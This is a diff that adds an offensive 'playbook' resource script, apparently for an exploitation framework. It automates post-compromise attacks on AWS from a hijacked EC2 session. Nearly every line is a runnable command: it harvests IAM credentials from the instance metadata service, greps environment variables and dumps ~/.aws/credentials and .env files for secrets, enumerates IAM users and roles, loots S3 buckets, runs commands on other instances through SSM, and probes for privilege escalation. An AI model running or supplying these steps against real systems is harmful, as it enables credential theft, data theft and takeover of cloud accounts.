@@ -1,0 +1,70 @@
+# ===========================================================================
+# Megaploit Community Playbook — AWS Cloud Pivot
+# ===========================================================================
+# Objective : From an initial foothold on an EC2 instance, harvest IMDS
+#             credentials and pivot laterally via AWS SSM and IAM escalation.
+#
+# TTPs covered (MITRE ATT&CK):
+#   T1552.005  Cloud Instance Metadata API   (IMDSv1/v2 harvest)
+#   T1078.004  Cloud Accounts                (stolen IAM keys)
+#   T1021.007  Cloud Services (SSM)          (lateral movement)
+#   T1087.004  Cloud Account Discovery       (IAM enum)
+#   T1530      Data from Cloud Storage       (S3 loot)
+#
+# Variables:
+#   ${SESSION}     — session on the compromised EC2 instance
+#   ${AWS_PROFILE} — local AWS profile name (filled after cred harvest)
+#
+# Usage:
+#   resource playbooks/cloud_pivot_aws.rc
+#
+# Prerequisites:
+#   - Session on an EC2 instance (Linux or Windows)
+#   - aws CLI available on operator workstation
+# ===========================================================================
+
+session ${SESSION}
+
+# ── Phase 1: IMDSv1 Credential Harvest ──────────────────────────────────────
+shell curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
+# Replace ROLE_NAME with output of above command:
+shell curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
+shell curl -s http://169.254.169.254/latest/meta-data/instance-id
+shell curl -s http://169.254.169.254/latest/meta-data/placement/region
+
+# ── Phase 2: IMDSv2 Credential Harvest (if IMDSv1 is blocked) ───────────────
+shell TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600") && curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
+
+# ── Phase 3: User Data (may contain secrets / bootstrap creds) ──────────────
+shell curl -s http://169.254.169.254/latest/user-data
+
+# ── Phase 4: Environment Variables (may contain hardcoded keys) ─────────────
+shell env | grep -iE "aws|key|secret|token|password|credential"
+shell cat ~/.aws/credentials 2>/dev/null
+shell cat ~/.aws/config 2>/dev/null
+shell find / -name "*.env" -o -name ".env" 2>/dev/null | head -20 | xargs grep -liE "aws|secret"
+
+# ── Phase 5: Local IAM Enumeration ──────────────────────────────────────────
+# Run from operator workstation after saving harvested keys
+# aws sts get-caller-identity
+# aws iam list-attached-user-policies --user-name <user>
+# aws iam list-user-policies --user-name <user>
+# aws iam get-user --user-name <user>
+shell aws iam list-users 2>/dev/null | head -40
+shell aws iam list-roles 2>/dev/null | head -40
+
+# ── Phase 6: S3 Bucket Discovery + Loot ─────────────────────────────────────
+shell aws s3 ls 2>/dev/null
+shell aws s3 ls s3://BUCKET_NAME --recursive 2>/dev/null | head -50
+
+# ── Phase 7: SSM Lateral Movement ───────────────────────────────────────────
+# List reachable EC2 instances via SSM
+shell aws ssm describe-instance-information --query 'InstanceInformationList[*].[InstanceId,IPAddress,PlatformName]' --output table 2>/dev/null
+# Execute on a target instance:
+# aws ssm send-command --instance-ids "i-TARGET_ID" --document-name "AWS-RunShellScript" --parameters 'commands=["id","whoami","cat /etc/passwd"]'
+
+# ── Phase 8: Check for Privilege Escalation Paths ───────────────────────────
+shell aws iam simulate-principal-policy --policy-source-arn arn:aws:iam::ACCOUNT_ID:user/USER --action-names iam:CreateUser iam:AttachUserPolicy iam:PutUserPolicy 2>/dev/null
+
+# ── Report ───────────────────────────────────────────────────────────────────
+loot list
